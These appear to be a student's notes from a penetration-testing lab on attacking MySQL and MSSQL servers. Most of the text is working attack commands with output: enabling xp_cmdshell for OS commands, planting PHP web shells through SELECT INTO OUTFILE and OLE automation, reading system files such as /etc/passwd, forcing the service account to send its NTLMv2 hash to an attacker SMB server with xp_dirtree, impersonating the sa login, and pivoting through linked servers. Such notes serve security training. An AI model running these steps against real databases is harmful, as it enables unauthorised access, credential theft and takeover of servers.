- [Attacking SQL](#attacking-sql)
  - [Enumeration](#enumeration)
  - [Authentication Methods](#authentication-methods)
  - [Misconfigurations](#misconfigurations)
    - [Privileges](#privileges)
  - [Protocol Specific Attacks](#protocol-specific-attacks)
    - [SQL Default Databases](#sql-default-databases)
      - [MySQL Default System Schemas/Databases](#mysql-default-system-schemasdatabases)
      - [MSSQL Default System Schemas/Databases](#mssql-default-system-schemasdatabases)
    - [Read/Change the Database](#readchange-the-database)
    - [Execute Commands](#execute-commands)
    - [Write Local Files](#write-local-files)
    - [Read Local Files](#read-local-files)
    - [Capture MSSQL Service Hash](#capture-mssql-service-hash)
    - [Impersonate Existing Users with MSSQL](#impersonate-existing-users-with-mssql)
    - [Communicate with Other DBs with MSSQL](#communicate-with-other-dbs-with-mssql)

---

# Attacking SQL

## Enumeration

By default MSSQL uses ports TCP71433 and UDP/1434, and MySQL uses TCP/3306. However, when MSSQL operates in a "hidden" mode, it uses TCP/2433 port. You can use Nmap's default scripts ```-sC``` option to enumerate database services on a target system.

```bash
d41y@htb[/htb]$ nmap -Pn -sV -sC -p1433 10.10.10.125

Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-26 02:09 BST
Nmap scan report for 10.10.10.125
Host is up (0.0099s latency).

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: mssql-test
|   DNS_Domain_Name: HTB.LOCAL
|   DNS_Computer_Name: mssql-test.HTB.LOCAL
|   DNS_Tree_Name: HTB.LOCAL
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-08-26T01:04:36
|_Not valid after:  2051-08-26T01:04:36
|_ssl-date: 2021-08-26T01:11:58+00:00; +2m05s from scanner time.

Host script results:
|_clock-skew: mean: 2m04s, deviation: 0s, median: 2m04s
| ms-sql-info: 
|   10.10.10.125:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
```

The scan reveals essential information about the target, like the version and hostname, which you can use to identify common misconfigurations, specific attacks, or known vulnerabilities.

## Authentication Methods

MSSQL supports two authentication methods, which means that users can be created in Windows or the SQL server:

| Authentication Type | Description |
| ------------------- | ----------- |
| Windows authentication mode | This is the default, often referred to as integrated security because the SQL server security model is tightly integrated with Windows/AD. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials. |
| Mixed mode | ... supports authentication by Windows/AD accounts and SQL Server. Username and password pairs are maintained within SQL Server. |

MySQL also supports different authentication methods, such as username and password, as well as Windows authentication. In addition, admins can choose an authentication mode for many reasons, including compability, security, and more. However, depending on which method is implemented, misconfigurations can occur.

## Misconfigurations

Misconfigured authentication in SQL Server can let you access the service without credentials if anonymous access is enabled, a user without a password is configured, or any user, group, or machine is allowed to access the SQL Server.

### Privileges

Depending on the user's privileges, you maye be able to perform different actions within a SQL Server, such as:

- read or change the contents of a database
- read or change the server configuration
- execute commands
- read local files
- communicate with other databases
- capture the local system hash
- impersonate existing users
- gain access to other networks

## Protocol Specific Attacks

### SQL Default Databases

It is essential to know the default databases for MySQL and MSSQL. Those databases hold information about the database itself and help you enumerate database names, tables, columns, etc. With access to those databases, you can use some system stored procedures, but they usually don't contain company data.

#### MySQL Default System Schemas/Databases

- **mysql**: is the system database that contains tables that store information required by the MySQL server
- **information_schema**: provides access to database metadata
- **performance_schema**: is a feature for monitoring MySQL Server execution at a low level
- **sys**: a set of objects that helps DBAs and developers interpret data collected by the Performance Schema

#### MSSQL Default System Schemas/Databases

- **master**: keeps the information for an instance of SQL Server
- **msdb**: used by SQL Server Agent
- **model**: a template database copied for each new database
- **resource**: a read-only database that keeps system objects visible in every database on the server in sys schema
- **tempdb**: keeps temporary objects for SQL queries

### Read/Change the Database

Imagine you gained access to a SQL database. First, you need to identify existing databases on the server, what tables the database contains, and finally, the contents of each table. Keep in mind that you may find databases with hundreds of tables. If your goal is not just getting access to the data, you will need to pick which table may contain interesting information to continue your attacks, such as usernames and passwords, tokens configurations, and more.

```bash
d41y@htb[/htb]$ mysql -u julio -pPassword123 -h 10.129.20.13

Welcome to the MariaDB monitor. Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```

... or:

```
C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30

1>
```

If you're targeting MSSQL from Linux, you can use ```sqsh``` as an alternative to ```sqlcmd```:

```bash
d41y@htb[/htb]$ sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h

sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1>
```

Alternatively, you can use the tool from Impacket with the name mssqlclient.py.

```bash
d41y@htb[/htb]$ mssqlclient.py -p 1433 julio@10.129.203.7 

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password: MyPassword!

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (120 7208) 
[!] Press help for extra shell commands
SQL> 
```

When using Windows authentication, you need to specify the domain name or the hostname of the target machine. If you don't specify a domain or hostname, it will assume SQL authentication and authenticate against the users created in the SQL server. Instead, if you define the domain or hostname, it will use Windows authentication. If you are targeting a local account, you can use ```SERVERNAME\\accountname``` or ```.\\accountname```.

```bash
d41y@htb[/htb]$ sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h

sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1>
```

### Execute Commands

Command execution is one of the most desired capabilities when attacking common services because it allows you to control the OS. If you have the appropriate privileges, you can use the SQL database to execute system commands or create the necessary elements to do it.

MSSQL has a extended stored procedures called ```xp_cmdshell``` which allow you to execute system commands using SQL. Keep in mind the following about it:

- xp_cmdshell is a powerful feature and disabled by default. xp_cmdshell can be enabled and disabled by using the Policy-Based Management or by executing ```sp_configure```.
- The Windows process spawned by xp_cmdshell has the same security rights as the SQL Server service account.
- xp_cmdshell operates synchronously. Control is not returned to the caller until the command-shell command is completed.

To execute commands using SQL syntax on MSSQL, use:

```
1> xp_cmdshell 'whoami'
2> GO

output
-----------------------------
no service\mssql$sqlexpress
NULL
(2 rows affected)
```

If xp_cmdshell is not enabled, you can enable it, if you have the appropriate privileges, using the following command:

```
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```

There are other methods to get command execution, such as adding extended stored procedures, CLR Assemblies, SQL Server Agent Jobs, and external scripts. However, besides those methods there are also additional functionalities that can be used like the xp_regwrite command that is used to elevate privileges by creating new entries in the Windows registry.

MySQL supports User Defined Functions which allows you to execute C/C++ code as a function within SQL, there's one User Defined Function for command execution in this [GitHub repo](https://github.com/mysqludf/lib_mysqludf_sys). It is not recommended to encounter a user-defined function like this in a production environment, but you should be aware that yoz may be able to use it.

### Write Local Files

MySQL does not have a stored procedure like xp_cmdshell, but you can achieve command execution if you write to a location in the file system that can execute your command. For example, suppose MySQL operates on a PHP-based web server or other programming languages like ASP.NET. If you have the appropriate privileges, you can attempt to write a file using ```SELECT INTO OUTFILE``` in the webserver directory. Then you can browse to the location where the file is and execute your commands.

```
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

Query OK, 1 row affected (0.001 sec)
```

In MySQL, a global system variable ```secure_file_priv``` limits the effect of data import and export operations, such as those performed by the ```LOAD DATA``` and ```SELECT ... INTO OUTFILE``` statements and the ```LOAD_FILE()``` function. These operations are permitted only to users who have the FILE privilege.

```secure_file_priv``` may be set as follows:

- If empty, the variable has no effect, which is not a secure setting.
- If set to the name of a directory, the server limits the import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
- If set to NULL, the server disables import and export operations.

In the following example, you can see the ```secure_file_priv``` variable is empty, which means you can read and write data using MySQL.

```
mysql> show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+

1 row in set (0.005 sec)
```

To write files using MSSQL, you need to enable Ole Automation Procedures, which requires admin privileges, and then execute some stored procedures to create the file:

```
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO

...

1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

### Read Local Files

By default, MSSQL allows file read on any file in the OS to which the account has read access. You can use the following SQL query:

```
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO

BulkColumn

-----------------------------------------------------------------------------
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to hostnames. Each
# entry should be kept on an individual line. The IP address should

(1 rows affected)
```

By default a MySQL installation does not allow arbitrary file read, but if the correct settings are in place and with the appropriate privileges, you can read files using the following methods:

```
mysql> select LOAD_FILE("/etc/passwd");

+--------------------------+
| LOAD_FILE("/etc/passwd")
+--------------------------------------------------+
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync

<SNIP>
```

### Capture MSSQL Service Hash

You can steal the MSSQL service account hash using ```xp_subdirs``` or ```xp_dirtree``` undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specific parent directory from the file system. When you use one of these stored procedures and point it to your SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL server.

To make this work, you first need to start Responder or impacket-smbserver and execute one of the following SQL queries:

```
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO

subdirectory    depth
--------------- -----------
```

... or:

```
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO

HResult 0x55F6, Level 16, State 1
xp_subdirs could not access '\\10.10.110.17\share\*.*': FindFirstFile() returned error 5, 'Access is denied.'
```

If the service account has access to your server, you will obtain its hash. You can then attempt to crack the hash or relay it to another host.

```bash
d41y@htb[/htb]$ sudo responder -I tun0

                                         __               
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|              
<SNIP>

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : SRVMSSQL\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
```

... or:

```bash
d41y@htb[/htb]$ sudo impacket-smbserver share ./ -smb2support

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 
[*] Config file parsed                                                 
[*] Config file parsed                                                 
[*] Config file parsed
[*] Incoming connection (10.129.203.7,49728)
[*] AUTHENTICATE_MESSAGE (WINSRV02\mssqlsvc,WINSRV02)
[*] User WINSRV02\mssqlsvc authenticated successfully                        
[*] demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
[*] Closing down connection (10.129.203.7,49728)                      
[*] Remaining connections []
```

### Impersonate Existing Users with MSSQL

SQL Server has a special permission, named ```IMPERSONATE```, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends.

First, you need to identify users that you can impersonate. Sysadmins can impersonate anyone by default. But for non-administrator users, privileges must be explicitly assigned. You can use the following query to identify users you can impersonate:

```
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

name
-----------------------------------------------
sa
ben
valentin

(3 rows affected)
```

To get an idea of privesc, verify if your current user has the sysadmin role.

```
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

-----------
julio                                                                                                                    

(1 rows affected)

-----------
          0

(1 rows affected)
```

As the returned value 0 indicates, you do not have the sysadmin role, but you can impersonate the ```sa``` user. Impersonate the user and execute the same commands. To impersonate a user, you can use the Transact-SQL statement ```EXECUTE AS LOGIN``` and set it to the user you want to impersonate.

```
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO

-----------
sa

(1 rows affected)

-----------
          1

(1 rows affected)
```

>[!NOTE]
> It's recommended to run ```EXECUTE AS LOGIN``` within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using ```USE master```.

You can now execute any command as a sysadmin as the returned value 1 indicates. To revert the operation and return to your previous user, you can use the Transact-SQL statement ```REVERT```.

### Communicate with Other DBs with MSSQL

MSSQL has configuration option called linked servers. Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.

If you manage to gain access to a SQL Server with a linked server configured, you may be able to move laterally to that database server. Administrators can configure a linked server using credentials from the remote server. If those credentials have sysadmin privileges, you may be able to execute commands in the remote SQL instance.

```
1> SELECT srvname, isremote FROM sysservers
2> GO

srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0

(2 rows affected)
```

As you can see in the query's output, you have the name of the server and column ```isremote```, where 1 means is a remote server, and 0 is a linked server.

Next, you can attempt to identify the user used for the connection and its privilege. The EXECUTE statement can be used to send pass-through commands to linked servers. You add your command between parenthesis and specify the linked server between square brackets.

```
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO

------------------------------ ------------------------------ ------------------------------ -----------
DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1

(1 rows affected)
```

You can now execute queries with sysadmin privileges on the linked server. As sysadmin, you control the SQL Server istance. You can read data from any database or execute system commands with xp_cmdshell.